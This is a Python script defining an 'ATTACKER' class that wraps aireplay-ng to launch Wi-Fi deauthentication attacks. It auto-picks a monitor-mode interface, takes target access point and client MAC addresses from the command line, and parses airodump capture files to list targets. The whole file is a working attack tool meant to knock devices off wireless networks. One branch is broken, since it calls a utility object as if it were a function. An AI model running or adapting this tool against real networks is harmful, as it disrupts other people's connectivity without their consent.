#!/usr/bin/env python
# license removed for brevity
import os
import sys
current_folder = os.path.dirname(os.path.realpath(__file__))
sys.path.append(current_folder)


import numpy as np
import time
from utils.wifi_hd_detector import WIFI_HD_DETECTOR
from utils.sys_utils import SYS_UTILS
from utils.data_reader import DATA_READER
from utils.console_formatter import Console_Formatter
from parser import PARSER

class ATTACKER:
    version_ = "1.0"
    console = Console_Formatter(__name__)
    sys_util = SYS_UTILS()
    data_reader = DATA_READER()
    wifi_detector = None
    parser = PARSER()
    reference_file = None
    
    ap_info_list = None
    client_info_list = None
    
    flag_wifi_is_init = False
    
    def __init__(self):
        pass
        
    def __del__(self):
        pass
                    
    def init(self, interface=None, reference_file = None):
        print(self.console.INFO("Initializing ..."))
        self.wifi_detector = WIFI_HD_DETECTOR()
        self.flag_wifi_is_init = self.wifi_detector.is_init()
        if interface == None:
            if self.flag_wifi_is_init:
                self.wifi_detector.run(is_silent=True)
        
        if reference_file != None:
            self.airdumpreader(reference_file)
        
        return self.flag_wifi_is_init

    def airdumpreader(self, file_name):
        self.ap_info_list, self.client_info_list = self.parser.airdump_reader(os.path.join(current_folder, file_name))
        return self.ap_info_list, self.client_info_list
        
    def airattack(self, interface=None, ap_mac=None, ap_essid=None, client_mac=None, src_mac=None, deauth_count=0):
        '''
        ap_mac : 
        ap_essid : 
        client_mac :
        src_mac :
        deauth_count count : 
        '''
        print(self.console.INFO("Air attacking ..."))
        args = []
        cmd = ["aireplay-ng"]
        if ap_mac != None:
            args = np.append(args, "-a")
            args = np.append(args, ap_mac)
        if ap_essid != None:
            args = np.append(args, "-e")
            args = np.append(args, ap_essid)
        if src_mac != None:
            args = np.append(args, "-h")
            args = np.append(args, src_mac)
        if client_mac != None:
            args = np.append(args, "-c")
            args = np.append(args, client_mac)
        if deauth_count != None:
            args = np.append(args, "--deauth")
            args = np.append(args, deauth_count)
        
        args = np.append(args, "--ignore-negative-one")
            
        if interface == None:
            if self.flag_wifi_is_init:
                for i in range(len(self.wifi_detector.interface)):
                    if len(self.wifi_detector.interface[i]) > 3:
                        if self.wifi_detector.interface[i][0:3] == "mon" or self.wifi_detector.interface[i][-3:] == "mon":
                            print(self.console.INFO("Air attacking interface : {}".format(self.wifi_detector.interface[i])))
                            cmd = np.append(cmd, args)
                            cmd = np.append(cmd, self.wifi_detector.interface[i])
                            stdout = self.sys_util.sys_check_output(cmd)
                            #stdout, stderr = self.sys_util(cmd)
                            line_new = self.sys_util.msg_line_split(stdout)
                            return line_new
            else:
                return None
        else:
            print(self.console.INFO("Air attacking interface : {}".format(interface)))
            cmd = np.append(cmd, args)
            cmd = np.append(cmd, interface)
            stdout, stderr = self.sys_util(cmd)
            line_new = self.sys_util.msg_line_split(stdout)
            return line_new
         
         
def main(**kwargs):
    attacker = ATTACKER()

    attacker.init()
    #if len(load_dump_file_name) > 0:
        #ap_list, client_list = attacker.airdumpreader(load_dump_file_name)
    msg = attacker.airattack(**kwargs)

if __name__ == "__main__":
    args = sys.argv[1:]
    kwargs = {}
    for i in range(0, len(args),2):
        kwargs[args[i]] = args[i+1]
    #load_dump_file_name = raw_input("Input dump file name : ").strip()
    main(**kwargs)
        
        

